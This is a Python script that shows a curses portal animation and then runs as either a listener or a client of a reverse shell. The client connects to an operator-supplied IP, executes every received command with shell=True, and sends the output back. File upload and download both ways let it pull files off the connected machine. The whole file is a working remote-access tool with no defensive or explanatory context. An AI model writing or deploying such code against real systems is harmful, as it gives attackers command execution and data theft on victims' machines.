import socket
import subprocess
import os
import curses
import time
import random

# Portal animation frames
PORTAL_FRAMES = [
    ["     ( )     ",
     "    (   )    ",
     "   (     )   ",
     "    (   )    ",
     "     ( )     "],

    ["     { }     ",
     "    {   }    ",
     "   {     }   ",
     "    {   }    ",
     "     { }     "],

    ["     [ ]     ",
     "    [   ]    ",
     "   [     ]   ",
     "    [   ]    ",
     "     [ ]     "],

    ["     < >     ",
     "    <   >    ",
     "   <     >   ",
     "    <   >    ",
     "     < >     "]
]

def animate_portal(stdscr):
    curses.curs_set(0)  # Hide cursor
    stdscr.nodelay(1)   # Non-blocking input
    stdscr.timeout(100)

    height, width = stdscr.getmaxyx()
    portal_x = width // 2 - 6
    portal_y = height // 2 - 2

    frame = 0
    while True:
        stdscr.clear()
        
        # Print animated portal
        for i, line in enumerate(PORTAL_FRAMES[frame]):
            stdscr.addstr(portal_y + i, portal_x, line, curses.color_pair(1))

        stdscr.refresh()
        frame = (frame + 1) % len(PORTAL_FRAMES)  # Loop through frames
        time.sleep(0.1)

        key = stdscr.getch()
        if key == ord('q'):  # Press 'q' to exit
            break




def start_listener():
    host = input("Enter the IP to bind: ")
    port = int(input("Enter the port to listen on: "))
    
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((host, port))
    server.listen(5)
    print(f"[*] Listening on {host}:{port}")
    
    client_socket, client_addr = server.accept()
    print(f"[+] Connection received from {client_addr}")
    
    while True:
        command = input("Shell> ")
        client_socket.send(command.encode())

        if command.lower() == "exit":
            break
        
        elif command.lower().startswith("upload "):
            filename = command.split(" ", 1)[1]
            file_data = client_socket.recv(1024 * 1024)
            with open(filename, "wb") as f:
                f.write(file_data)
            print(f"[+] File {filename} received")
        
        elif command.lower().startswith("download "):
            filename = command.split(" ", 1)[1]
            client_socket.recv(1024)  # Wait for client confirmation
            try:
                with open(filename, "rb") as f:
                    file_data = f.read()
                client_socket.send(file_data)
            except FileNotFoundError:
                client_socket.send(b"File not found\n")
        
        else:
            response = client_socket.recv(4096).decode()
            print(response)
    
    client_socket.close()
    server.close()

def start_client():
    server_ip = input("Enter server IP: ")
    server_port = int(input("Enter server port: "))
    
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client.connect((server_ip, server_port))
        print(f"[+] Connected to {server_ip}:{server_port}")
    except Exception as e:
        print(f"[-] Connection failed: {e}")
        return
    
    while True:
        try:
            command = client.recv(1024).decode().strip()
            if not command:
                continue

            if command.lower() == "exit":
                client.send(b"Closing connection\n")
                break
            
            elif command.lower().startswith("cd "):
                try:
                    os.chdir(command[3:])
                    client.send(b"Changed directory successfully\n")
                except FileNotFoundError:
                    client.send(b"Directory not found\n")
            
            elif command.lower().startswith("upload "):
                filename = command.split(" ", 1)[1]
                try:
                    with open(filename, "rb") as f:
                        file_data = f.read()
                    client.sendall(file_data)
                except FileNotFoundError:
                    client.send(b"File not found\n")
            
            elif command.lower().startswith("download "):
                filename = command.split(" ", 1)[1]
                client.send(b"READY")
                file_data = client.recv(4096)
                with open(filename, "wb") as f:
                    f.write(file_data)
                client.send(b"File downloaded successfully\n")
            
            else:
                output = subprocess.run(command, shell=True, capture_output=True, text=True)
                result = output.stdout + output.stderr
                if not result:
                    result = "Command executed, but no output."
                client.send(result.encode())
        
        except Exception as e:
            client.send(f"Error: {str(e)}\n".encode())
    
    client.close()

if __name__ == "__main__":
    curses.wrapper(animate_portal)
    choice = input("Do you want to be a listener (server) or a client? (l/c): ").strip().lower()
    if choice == "l":
        start_listener()
    elif choice == "c":
        start_client()
    else:
        print("Invalid choice. Exiting.")
